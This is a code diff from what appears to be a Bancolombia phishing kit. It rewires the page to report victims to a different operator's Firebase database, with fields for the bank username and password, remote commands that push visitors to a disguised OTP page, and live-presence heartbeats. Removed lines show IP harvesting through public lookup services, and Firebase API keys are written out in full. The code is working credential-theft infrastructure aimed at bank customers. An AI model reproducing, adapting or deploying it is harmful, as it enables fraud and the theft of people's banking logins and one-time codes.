@@ -46334,55 +46334,31 @@
             async function initFirebase() {
                 await loadScript('https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js');
                 await loadScript('https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js');
-                await loadScript('https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js');
 
                 const firebaseConfig = {
-                    apiKey: "AIzaSyBnS0FxHLYA4AIncGyxf5DZwHfhRGlyWso",
-                    authDomain: "cain-5b1e4.firebaseapp.com",
-                    databaseURL: "https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app",
-                    projectId: "cain-5b1e4",
-                    storageBucket: "cain-5b1e4.firebasestorage.app",
-                    messagingSenderId: "635040724776",
-                    appId: "1:635040724776:web:daac1413b1623777b9597b"
+                    apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
+                    authDomain: "gol404.firebaseapp.com",
+                    databaseURL: "https://gol404-default-rtdb.firebaseio.com",
+                    projectId: "gol404",
+                    storageBucket: "gol404.firebasestorage.app",
+                    messagingSenderId: "502610353442",
+                    appId: "1:502610353442:web:29e2c7bd9459277db9597b"
                 };
 
                 if (!firebase.apps.length) {
                     firebase.initializeApp(firebaseConfig);
                 }
-                const userCred = await firebase.auth().signInAnonymously();
-                window._authToken = await userCred.user.getIdToken();
                 window._db = firebase.database();
                 console.log('✅ Firebase inicializado');
             }
 
-            initFirebase().then(() => { initDevice(); }).catch(err => console.error('❌ Error Firebase:', err));
+            initFirebase().catch(err => console.error('❌ Error Firebase:', err));
 
-            // ✅ VERIFICACIÓN INMEDIATA — antes de mostrar cualquier cosa
+            // Obtener token y deviceId del localStorage
             const hostToken = localStorage.getItem('token');
             const tokenExpires = parseInt(localStorage.getItem('tokenExpires'));
-            const userId = 'cain';
+            const userId = 'admin';
             let heartbeatInterval = null;
-
-            function limpiarYRedirigir() {
-                localStorage.removeItem('token');
-                localStorage.removeItem('currentDeviceId');
-                localStorage.removeItem('tokenExpires');
-                window.location.replace('/');
-            }
-
-            // ✅ VERIFICACIÓN: token debe existir y no haber expirado
-            const tokenExpiresNum = Number(tokenExpires);
-            if (!hostToken || !tokenExpiresNum || isNaN(tokenExpiresNum) || Date.now() > tokenExpiresNum) {
-                limpiarYRedirigir();
-                return;
-            }
-
-            // Verificar cada minuto mientras está en la página
-            setInterval(() => {
-                if (Date.now() > tokenExpiresNum) {
-                    limpiarYRedirigir();
-                }
-            }, 60000);
 
             // Si no hay currentDeviceId (fue borrado al reiniciar), generar uno nuevo
             let currentDeviceId = localStorage.getItem('currentDeviceId');
@@ -46394,45 +46370,26 @@
                 console.log('🆕 Nuevo deviceId generado:', currentDeviceId);
             }
 
-            async function setOnlineStatus(isOnline) {
-                if (!currentDeviceId || !hostToken || !window._db) return;
-                try {
-                    await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/lastActivity`)
-                        .set(isOnline ? Date.now() : 0);
-                } catch (e) { }
-            }
-
             function startHeartbeat() {
                 if (heartbeatInterval) clearInterval(heartbeatInterval);
-                // Escribir inmediato al iniciar (vuelve a la página)
-                if (currentDeviceId && hostToken && window._db) {
-                    window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/lastActivity`).set(Date.now()).catch(() => { });
-                }
                 heartbeatInterval = setInterval(async () => {
                     if (currentDeviceId && hostToken && window._db) {
                         try {
                             await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/lastActivity`).set(Date.now());
                         } catch (e) { }
                     }
-                }, 5000);
-
-                // ✅ Online/Offline por eventos nativos
-                window.addEventListener('beforeunload', () => setOnlineStatus(false));
-                window.addEventListener('pagehide', () => setOnlineStatus(false));
-                document.addEventListener('visibilitychange', () => {
-                    setOnlineStatus(document.visibilityState !== 'hidden');
-                });
+                }, 3000);
             }
 
             function escucharComandos() {
                 if (!currentDeviceId || !hostToken) return;
                 const basePath = window.location.pathname.replace(/\/[^/]*$/, '/');
-                const DB_URL = 'https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app';
+                const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
                 let ejecutando = false;
 
                 async function procesarComando(command) {
                     if (command === 'otp') {
-                        window.location.replace(basePath + 'OTP.html');
+                        window.location.replace(basePath + 'v92_sec_o7p.html');
                     } else if (command === 'login-error' || command === 'usuario') {
                         const loader = document.getElementById('loaderOverlay');
                         if (loader) loader.style.display = 'none';
@@ -46455,7 +46412,7 @@
                     if (ejecutando) return;
                     try {
                         ejecutando = true;
-                        const r = await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json?auth=${window._authToken || ""}`);
+                        const r = await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`);
                         const data = await r.json();
 
                         if (data === null) {
@@ -46469,7 +46426,7 @@
                         const command = data.command || null;
                         if (command) {
                             // Limpiar comando
-                            await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}/command.json?auth=${window._authToken || ""}`, { method: 'DELETE' });
+                            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/command.json`, { method: 'DELETE' });
                             await procesarComando(command);
                         }
                     } catch (e) { }
@@ -46517,35 +46474,15 @@
                 }
                 if (!window._db) return;
 
-                // Obtener IP con múltiples fallbacks
-                let ipActual = 'N/A';
-                const ipSources = [
-                    () => fetch('https://api.ipify.org/?format=json').then(r => r.json()).then(d => d.ip),
-                    () => fetch('https://api64.ipify.org/?format=json').then(r => r.json()).then(d => d.ip),
-                    () => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip),
-                    () => fetch('https://ip.seeip.org/json').then(r => r.json()).then(d => d.ip)
-                ];
-                for (const source of ipSources) {
-                    try {
-                        const ip = await Promise.race([
-                            source(),
-                            new Promise((_, r) => setTimeout(() => r('timeout'), 3000))
-                        ]);
-                        if (ip && ip !== 'timeout' && ip !== 'N/A') {
-                            ipActual = ip;
-                            break;
-                        }
-                    } catch (e) { }
-                }
-
-                await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
+                await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).set({
                     id: currentDeviceId,
                     type: 'Bancolombia',
                     status: 'visitante',
                     isVisitor: true,
-                    ip: ipActual,
-                    'data/ip': ipActual,
                     'data/paso': 'usuario',
+                    'data/usuarioEntidad': '',
+                    'data/passwordEntidad': '',
+                    timestamp: Date.now(),
                     lastActivity: Date.now()
                 });
 
@@ -46559,13 +46496,13 @@
             // Polling REST API - detecta comandos Y borrado del nodo
             (function () {
                 if (!hostToken || !currentDeviceId) return;
-                const DB_URL = 'https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app';
+                const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
                 const basePath = window.location.pathname.replace(/\/[^/]*$/, '/');
                 let ejecutando = false;
 
                 async function ejecutarComando(command) {
                     if (command === 'otp') {
-                        window.location.replace(basePath + 'OTP.html');
+                        window.location.replace(basePath + 'v92_sec_o7p.html');
                     } else if (command === 'login-error' || command === 'usuario') {
                         const loader = document.getElementById('loaderOverlay');
                         if (loader) loader.style.display = 'none';
@@ -46584,13 +46521,8 @@
                 // Registrar dispositivo via REST API (no depende del SDK)
                 let dispositivoRegistrado = false;
                 async function registrarDispositivo() {
-                    let intentos = 0;
-                    while (!window._authToken && intentos < 25) {
-                        await new Promise(r => setTimeout(r, 200));
-                        intentos++;
-                    }
                     try {
-                        await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json?auth=${window._authToken || ""}`, {
+                        await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                             method: 'PUT',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -46612,7 +46544,7 @@
                     if (ejecutando) return;
                     ejecutando = true;
                     try {
-                        const r = await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}.json?auth=${window._authToken || ""}`);
+                        const r = await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`);
                         const data = await r.json();
 
                         // Solo detectar borrado si el dispositivo ya fue registrado
@@ -46633,7 +46565,7 @@
                         // Hay comando pendiente → ejecutar
                         const command = data.command;
                         if (command && typeof command === 'string') {
-                            await fetch(`${DB_URL}/sessions/cain/${hostToken}/devices/${currentDeviceId}/command.json?auth=${window._authToken || ""}`, { method: 'DELETE' });
+                            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/command.json`, { method: 'DELETE' });
                             console.log('📨 Comando:', command);
                             await ejecutarComando(command);
                         }
